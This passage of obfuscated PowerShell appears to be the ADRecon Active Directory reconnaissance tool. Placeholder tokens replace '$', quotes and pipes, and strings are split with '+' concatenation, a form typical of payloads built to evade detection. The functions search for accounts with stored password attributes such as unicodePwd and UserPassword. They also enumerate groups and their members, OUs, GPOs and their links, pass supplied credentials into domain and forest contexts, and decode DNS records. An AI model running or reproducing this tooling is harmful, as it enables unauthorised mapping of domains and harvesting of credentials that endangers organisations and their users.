    https://msdn.microsoft.com/en-us/library/cc223248.aspx
    https://msdn.microsoft.com/en-us/library/cc223249.aspx
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADUsers = Get-ADObject -LDAPFilter xfJ4(0Ogv(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))xfJ4 -ResultPageSize bLHPageSize -Properties *
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRPasswordAttributes] Error while enumerating Password AttributeslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADUsers)
        {
            Write-Warning lEzj[*] Total PasswordAttribute Objects: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADUsers))lEzj
            bLHUserObj = bLHADUsers
            Remove-Variable ADUsers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(0Ogv(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj
        Try
        {
            bLHADUsers = bLHObjSearcher.FindAll()
      '+'  }
        Catch
        {
            Write-Warning lEzj[Get-ADRPasswordAttributes] Error while enumerating Password AttributeslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADUsers)
        {
            bLHcnt = [ADRecon.LDAPClass]::ObjectCount(bLHADUsers)
            If (bLHcnt -gt 0)
            {
                Write-Warning lEzj[*] Total PasswordAttribute Objects: bLHcntlEzj
            }
            bLHUserObj = bLHADUsers
            Remove-Variable ADUsers
        }
    }

    If (bLHUserObj)
    {
        Return bLHUserObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRGroup
{
<#
.SYNOPSIS
    Returns all groups and/or membership changes in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and/or membership changes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRGroups
    [bool]

.PARAMETER ADRGroupChanges
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHdate,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDo'+'main,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLHADROutputDir,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHOutputType,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHADRGroups = bLHtrue,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHADRGroupChanges = bLHfalse
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADGroups = @( Get-ADGroup -Filter * -ResultPageSize bLHPageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,xfJ4msDS-ReplValueMetaDataxfJ4,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroup] Error while enumerating Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADGroups)
        {
            Write-Verbose lEzj[*] Total Groups: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADGroups))lEzj
            If (bLHADRGroups)
            {
                bLHGroupObj = [ADRecon.ADWSClass]::GroupParser(bLHADGroups, bLHThreads)
            }
            If (bLHADRGroupChanges)
            {
                bLHGroupChangesObj = [ADRecon.ADWSClass]::GroupChangeParser(bLHADGroups, bLHdate, bLHThreads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectClass=group)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjadmincountlEzj,lEzjcanonicalnamelEzj, lEzjdistinguishednamelEzj, lEzjdescriptionlEzj, lEzjgrouptypelEzj,lEzjsamaccountnamelEzj, lEzjsidhistorylEzj, lEzjmanagedbylEzj, lEzjmsds-replvaluemetadatalEzj, lEzjobjectsidlEzj, lEzjwhencreatedlEzj, lEzjwhenchangedlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADGroups = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroup] Error while enumerating Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearch'+'er.dispose()

        If (bLHADGroups)
        {
            Write-Verbose lEzj[*] Total Groups: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADGroups))lEzj
            If (bLHADRGroups)
            {
                bLHGroupObj = [ADRecon.LDAPClass]::GroupParser(bLHADGroups, bLHThreads)
            }
            If (bLHADRGroupChanges)
            {
                bLHGroupChangesObj = [ADRecon.LDAPClass]::GroupChangeParser(bLHADGroups, bLHdate, bLHThreads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If (bLHGroupObj)
    {
        Export-ADR -ADRObj bLHGroupObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjGroupslEzj
        Remove-Variable GroupObj
    }

    If (bLHGroupChangesObj)
    {
        Export-ADR -ADRObj bLHGroupChangesObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjGroupChangeslEzj
        Remove-Variable GroupChangesObj
    }
}

Function Get-ADRGroupMember
{
<#
.SYNOPSIS
    Returns all groups and their members in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and their members in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The Page'+'Size to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADDomain = Get-ADDomain
            bLHADDomainSID = bLHADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroupMember] Error getting Domain '+'ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        Try
        {
            bLHADGroups = bLHADGroups = @( Get-ADGroup -Filter * -ResultPageSize bLHPageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroupMember] Error while enumerating Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        Try
        {
            bLHADGroupMembers = @( Get-ADObject -LDAPFilter xfJ4(0Ogv(memberof=*)(primarygroupid=*))xfJ4 -Properties DistinguishedName,ObjectClass,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroupMember] Error while enumerating GroupMember ObjectslEzj
            '+'Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If ( (bLHADDomainSID) -and (bLHADGroups) -and (bLHADGroupMembers) )
        {
            Write-Verbose lEzj[*] Total GroupMember Objects: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADGroupMembers))lEzj
            bLHGroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser(bLHADGroups, bLHADGroupMembers, bLHADDomainSID, bLHThreads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {

        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().passwo'+'rd))
            Try
            {
                bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(bLHDomainContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRGroupMember] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            Remove-Variable DomainContext
            Try
            {
                bLHForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContex'+'t(lEzjForestlEzj,bLH(bLHADDomain.Forest),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
                bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(bLHForestContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRGroupMember] Error getting Forest ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
            If (bLHForestContext)
            {
                Remove-Variable ForestContext
            }
            If (bLHADForest)
            {
                bLHGlobalCatalog = bLHADForest.FindGlobalCatalog()
            }
            If (bLHGlobalCatalog)
            {
                bLHDN = lEzjGC://bLH(bLHGlobalCatalog.IPAddress)/bLH(bLHobjDomain.distinguishedname)lEzj
                Try
                {
                    bLHADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (bLH(bLHDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
                    bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHADObject.objectSid[0], 0)
                    bLHADObject.Dispose()
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog bLH(bLHGlobalCatalog.IPAddress). Using SID from the ObjDomain.lEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        '+'            bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
                }
            }
            Else
            {
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
            }
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                bLHGlobalCatalog = bLHADForest.FindGlobalCatalog()
                bLHDN = lEzjGC://bLH(bLHGlobalCatalog)/bLH(bLHobjDomain.distinguishedname)lEzj
                bLHADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (bLHDN)
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHADObject.object'+'Sid[0], 0)
        '+'        bLHADObject.dispose()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog bLH(bLHGlobalCatalog.IPAddress). Using SID from the ObjDomain.lEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
            }
        }

        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectClass=group)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjsamaccountnamelEzj, lEzjobjectsidlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADGroups = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroupMember] Error while enumerating Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.'+'dispose()

        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(0Ogv(memberof=*)(primarygroupid=*))lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj, lEzjdnshostnamelEzj, lEzjobjectclasslEzj, lEzjprimarygroupidlEzj, lEzjmemberoflEzj, lEzjsamaccountnamelEzj, lEzjsamaccounttypelEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADGroupMembers = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGroupMember] Error while enumerating GroupMember ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If ( (bLHADDomainSID) -and (bLHADGroups) -and (bLHADGroupMembers) )
        {
            Write-Verbose lEzj[*] Total GroupMember Objects: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADGroupMembers))lEzj
            bLHGroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser(bLHADGroups, bLHADGroupMembers, bLHADDomainSID, bLHThreads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If (bLHGroupMemberObj)
    {
        Return bLHGroupMemberObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADROU
{
<#
.SYNOPSIS
    Returns all Organizational Units (OU) in the current (or specified) domain.

.DESCRIPTION
    Returns all Organizational Units (OU) in the current (or specified) domain.

.PARAMETER Method
    [s'+'tring]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADROU] Error while enumerating OU ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADOUs)
        {
            Write-Verbose lEzj[*] Total OUs: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADOUs))lEzj
            bLHOUObj = [ADRecon.ADWSClass]::OUParser(bLHADOUs, bLHThreads)
            Remove-Variable ADOUs
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectclass=organizationalunit)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjdescriptionlEzj,lEzjnamelEzj,lEzjwhencreatedlEzj,lEzjwhenchangedlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADOUs = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADROU] Error while enumerating OU ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADOUs)
        {
            Write-Verbose lEzj[*] Total OUs: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADOUs))lEzj
            bLHOUObj = [ADRecon.LDAPClass]::OUParser(bLHADOUs, bLHThreads)
            Remove-Variable ADOUs
        }
    }

    If (bLHOUObj)
    {
        Return bLHOUObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRGPO
{
<#
.SYNOPSIS
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.DESCRIPTION
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADGPOs = @( Get-ADObject -LDAPFilter xfJ4(objectCategory=groupPolicyContainer)xfJ4 -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPO] Error while enumerating groupPolicyContainer ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADGPOs)
        {
            Write-Verbose lEzj[*] Total GPOs: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADGPOs))lEzj
            bLHGPOsObj = [ADRecon.ADWSClass]::GPOParser(bLHADGPOs, bLHThreads)
            Remove-Variable ADGPOs
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectCategory=groupPolicyContainer)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADGPOs = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPO] Error while enumerating groupPolicyContainer ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADGPOs)
        {
            Write-Verbose lEzj[*] Total GPOs: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADGPOs))lEzj
            bLHGPOsObj = [ADRecon.LDAPClass]::GPOParser(bLHADGPOs, bLHThreads)
            Remove-Variable ADGPOs
        }
    }

    If (bLHGPOsObj)
    {
        Return bLHGPOsObj
    }
    Else
    {
        Return bLHnull
    }
}

# based on https://github.com/GoateePFE/GPLinkReport/blob/master/gPLinkReport.ps1
Function Get-ADRGPLink
{
<#
.SYNOPSIS
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.DESCRIPTION
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
 '+'   PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADSOMs = @( Get-ADObject -LDAPFilter xfJ4(0Ogv(objectclass=domain)(objectclass=organizationalUnit))xfJ4 -Properties DistinguishedName,Name,gPLink,gPOptions )
            bLHADSOMs += @( Get-ADObject -SearchBase lEzjCN=Sites,bLH((Get-ADRootDSE).configurationNamingContext)lEzj -LDAPFilter lEzj(objectclass=site)lEzj -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPLink] Error while enumerating SOM ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        Try
        {
            bLHADGPOs = @( Get-ADObject -LDAPFilter xfJ4(objectCategory=groupPolicyContainer)xfJ4 -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPLink] Error while enumerating groupPolicyContainer ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If ( (bLHADSOMs) -and (bLHADGPOs) )
        {
            Write-Verbose lEzj[*] Total SOMs: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADSOMs))lEzj
            bLHSOMObj = [ADRecon.ADWSClass]::SOMParser(bLHADGPOs, bLHADSOMs, bLHThreads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHADSOMs = @()
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(0Ogv(objectclass=domain)(objectclass=organizationalUnit))lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjnamelEzj,lEzjgplinklEzj,lEzjgpoptionslEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADSOMs += bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPLink] Error while enumerating SOM ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        bLHSearchPath = lEzjCN=SiteslEzj
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLHSearchPath,bLH(bLHobjDomainRootDSE.Confi'+'gurationNamingContext)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
        Else
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLHSearchPath,bLH(bLHobjDomainRootDSE.ConfigurationNamingContext)lEzj
        }
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHObjSearcher.Filter'+' = lEzj(objectclass=site)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjnamelEzj,lEzjgplinklEzj,lEzjgpoptionslEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADSOMs += bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPLink] Error while enumerating SOM ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectCategory=groupPolicyContainer)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADGPOs = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPLink] Error while enumerating groupPolicyContainer ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If ( (bLHADSOMs) -and (bLHADGPOs) )
        {
            Write-Verbose lEzj[*]'+' Total SOMs: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADSOMs))lEzj
            bLHSOMObj = [ADRecon.LDAPClass]::SOMParser(bLHADGPOs, bLHADSOMs, bLHThreads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If (bLHSOMObj)
    {
        Return bLHSOMObj
    }
    Else
    {
        Return bLHnull
    }
}

# Modified Convert-DNSRecord function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Convert-DNSRecord
{
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. SmithxfJ4s code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType(xfJ4System.Management.Automation.PSCustomObjectxfJ4)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = bLHTrue, ValueFromPipelineByPropertyName = bLHTrue)]
        [Byte[]]
        bLHDNSRecord'+'
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(xfJ4PSUseOutputTypeCorrectlyxfJ4, xfJ4xfJ4)]
            [CmdletBinding()]
            Param(
                [Byte[]]
                bLHRaw
            )

            [Int]bLHLength = bLHRaw[0]
            [Int]bLHSegments = bLHRaw[1]
            [Int]bLHIndex =  2
            [String]bLHName  = xfJ4xfJ4

            while (bLHSegments-- -gt 0)
            {
                [Int]bLHSegmentLength = bLHRaw[bLHIndex++]
                while (bLHSegmentLength-- -gt 0)
                {
                    bLHName += [Char]bLHRaw[bLHIndex++]
                }
                bLHName += lEzj.lEzj
            }
            bLHName
        }
    }

    PROCESS
    {
        # bLHRDataLen = [BitConverter]::ToUInt16(bLHDNSRecord, 0)
        bLHRDataType = ['+'BitConverter]::ToUInt16(bLHDNSRecord, 2)
        bLHUpdatedAtSerial = [BitConverter]::ToUInt32(bLHDNSRecord, 8)

        bLHTTLRaw = bLHDNSRecord[12..15]

        # reverse for big endian
        bLHNull = [array]::Reverse(bLHTTLRaw)
        bLHTTL = [BitConverter]::ToUInt32(bLHTTLRaw, 0)

        bLHAge = [BitConverter]::ToUInt32(bLHDNSRecord, 20)
        If (bLHAge -ne 0)
        {
            bLHTimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute'+' 0 -Second 0).AddHours(bLHage)).ToString()
        }
        Else
        {
            bLHTimeStamp = xfJ4[static]xfJ4
        }

        bLHDNSRecordObject = New-Object PSObject

        switch (bLHRDataType)
        {
            1
            {
                bLHIP = lEzj{0}.{1}.{2}.{3}lEzj -f bLHDNSRecord[24], bLHDNSRecord[25], bLHDNSRecord[26], bLHDNSRecord[27]
                bLHData = bLHIP
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4AxfJ4
            }

            2
            {
                bLHNSName = Get-Name bLHDNSRecord[24..bLHDNSRecord.length]
                bLHData = bLHNSName
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4NSxfJ4
            }

            5
            {
                bLHAlias = Get-Name bLHDNSRecord[24..bLHDNSRecord.length]
                bLHData = bLHAlias
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4CNAMExfJ4
            }

            6
            {
                bLHPrimaryNS = Get-Name bLHDNSRecord[44..bLHDNSRecord.length]
                bLHResponsibleParty = Get-Name bLHDNSRecord[bLH(46+bLHDNSRecord[44])..bLHDNSRecord.length]
